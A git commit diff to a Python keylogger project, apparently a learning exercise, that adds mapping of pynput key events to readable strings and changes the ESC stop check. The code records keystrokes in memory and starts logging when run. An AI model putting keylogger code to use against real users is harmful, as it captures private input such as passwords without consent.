7c6eb196e1593bb4dedfdd4abab24f92aa4fdb00
israelr9897 <admin@admins-MacBook-Pro.local>
2025-02-16 13:40:22 +0200

    special_char_2

--- keylogger/new_keylogger.py
+++ keylogger/new_keylogger.py
@@ -2,6 +2,9 @@ from inter_face import IKeyLogger
 from typing import List
 from pynput.keyboard import Key, Listener, KeyCode
 
+# יבוא מקובץ תווים מיוחדים
+from special_characters import special_keys
+
 
 class KeyloggerService(IKeyLogger):
     def __init__(self):
@@ -18,10 +21,16 @@ class KeyloggerService(IKeyLogger):
     def get_logged_keys(self) -> List[str]:
         return self.presses
 
+    def key_to_string(self,key):
+        if isinstance(key, KeyCode):
+            return key.char or ""
+        return special_keys.get(key, f"<{key}>")
+
     def press(self,key):
-        if key == Key.esc:
+        key_str = self.key_to_string(key)
+        if key_str == "<ESC>":
             self.stop_logging()
-        self.presses.append(key)
+        self.presses.append(key_str)
 
 x = KeyloggerService()
 x.start_logging()
